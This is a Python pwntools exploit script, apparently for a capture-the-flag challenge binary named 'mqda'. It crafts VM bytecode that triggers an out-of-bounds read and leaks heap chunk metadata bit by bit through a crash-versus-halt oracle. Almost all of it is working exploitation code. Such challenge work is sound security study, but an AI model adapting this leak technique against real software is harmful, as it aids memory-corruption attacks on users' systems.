#!/usr/bin/env python3
"""
Exploit: Use OOB read to leak heap metadata

The OOB read happens at POP when SP & 0xFF = 0xFF.
This reads 4 bytes from page[0x103..0x106], where bytes 0x104-0x106
are in the next chunk's prev_size.

To leak something useful, we need to:
1. Allocate pages in a pattern
2. Use OOB read to see what's in the adjacent chunk area
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_oob_leak_test(bit_position, expected_bit):
    """
    Create code that:
    1. Allocates page A at 0x0000
    2. Allocates page B at 0x0100
    3. Uses OOB read from page A (SP=0xFF) to read into page B's prev_size
    4. Tests a specific bit of the read value
    """
    code = b''
    
    # Allocate page at 0x0000 with non-zero data
    code += mov_reg_imm(15, 0x00)
    code += mov_reg_imm(0, 0x41414141)
    code += push_reg(0)
    
    # Allocate page at 0x0100 with non-zero data
    code += mov_reg_imm(15, 0x100)
    code += mov_reg_imm(0, 0x42424242)
    code += push_reg(0)
    
    # OOB read from page 0x0000 at offset 0xFF
    # This reads page[0x103..0x106] which is:
    # - byte 0x103: last byte of page A data (our data)
    # - bytes 0x104-0x106: into page B's prev_size area
    code += mov_reg_imm(15, 0xFF)  # SP = 0xFF
    code += pop_reg(0)  # r0 = OOB read value
    
    # Test specific bit
    if bit_position > 0:
        shl_amount = 31 - bit_position
        if shl_amount > 0:
            code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_oob_bit(bit_position, expected_bit=1):
    code = create_oob_leak_test(bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_oob_dword():
    """Leak the 4-byte OOB read value."""
    val = 0
    for bit in range(32):
        sys.stdout.write(f"\r[*] Bit {bit}/32...")
        sys.stdout.flush()
        if test_oob_bit(bit, 1):
            val |= (1 << bit)
    print()
    return val

def main():
    print("[*] OOB Leak Test")
    print("[*] =============")
    print("[*] Reading 4 bytes via OOB read (page[0x103..0x106])...")
    print("[*] - Byte 0 (bit 0-7): Last byte of page A data")
    print("[*] - Bytes 1-3 (bit 8-31): Page B's prev_size bytes 4-6 + ??")
    
    val = leak_oob_dword()
    print(f"\n[+] OOB read value: 0x{val:08x}")
    
    # Byte 0 should be 0x41 (last byte of 0x41414141 we wrote)
    byte0 = val & 0xFF
    print(f"[*] Byte 0: 0x{byte0:02x} (expected: 0x41)")
    
    # Bytes 1-3 are from prev_size of next chunk (normally 0)
    bytes123 = (val >> 8) & 0xFFFFFF
    print(f"[*] Bytes 1-3: 0x{bytes123:06x} (from prev_size)")

if __name__ == '__main__':
    main()
